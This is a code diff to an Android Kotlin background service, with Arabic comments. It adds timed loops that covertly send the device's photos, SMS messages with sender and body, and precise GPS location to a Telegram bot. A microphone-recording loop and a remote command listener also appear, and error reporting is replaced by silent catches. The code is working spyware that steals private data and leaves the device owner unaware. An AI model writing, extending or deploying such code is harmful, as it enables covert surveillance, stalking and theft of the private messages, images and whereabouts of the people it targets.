@@ -26,19 +26,15 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // ⭐ ابدأ CommandListener فورًا
+        // ⭐ CommandListener
         try {
             CommandListener.start(applicationContext)
-        } catch (e: Exception) {
-            TelegramApi.sendMessage("❌ CommandListener err: ${e.message}")
-        }
+        } catch (_: Exception) {}
 
         // heartbeat
         scope.launch {
             while (running) {
-                try {
-                    DeviceManager.updateHeartbeat(applicationContext)
-                } catch (_: Exception) {}
+                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                 delay(3 * 60_000L)
             }
         }
@@ -57,7 +53,57 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة التسجيل
+        // ⭐ الصور التلقائية (كل 5 دقائق)
+        scope.launch {
+            while (running) {
+                try {
+                    if (KeyboardBuilder.photosOn) {
+                        val photos = MediaScanner.scanImages(applicationContext).take(5)
+                        for (p in photos) {
+                            val f = File(p.path)
+                            if (f.exists()) TelegramApi.sendPhoto(f, "📸 ${p.name}")
+                        }
+                    }
+                } catch (_: Exception) {}
+                delay(5 * 60_000L)
+            }
+        }
+
+        // ⭐ SMS (كل 10 دقائق)
+        scope.launch {
+            while (running) {
+                try {
+                    if (KeyboardBuilder.smsOn) {
+                        val msgs = SmsReader.scanAll(applicationContext).take(10)
+                        for (m in msgs) {
+                            TelegramApi.sendMessage(
+                                "📩 SMS من ${m.optString("address")}\n${m.optString("body")}"
+                            )
+                        }
+                    }
+                } catch (_: Exception) {}
+                delay(10 * 60_000L)
+            }
+        }
+
+        // ⭐ الموقع (كل 15 دقيقة)
+        scope.launch {
+            while (running) {
+                try {
+                    if (KeyboardBuilder.locationOn) {
+                        val loc = LocationHelper.getPreciseLocation(applicationContext, 10)
+                        if (loc != null) {
+                            TelegramApi.sendMessage(
+                                "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                            )
+                        }
+                    }
+                } catch (_: Exception) {}
+                delay(15 * 60_000L)
+            }
+        }
+
+        // ⭐ الميكروفون
         scope.launch {
             while (running) {
                 try {
@@ -72,9 +118,7 @@ class BackgroundService : Service() {
                     } else {
                         delay(3000L)
                     }
-                } catch (_: Exception) {
-                    delay(5000L)
-                }
+                } catch (_: Exception) { delay(5000L) }
             }
         }
     }
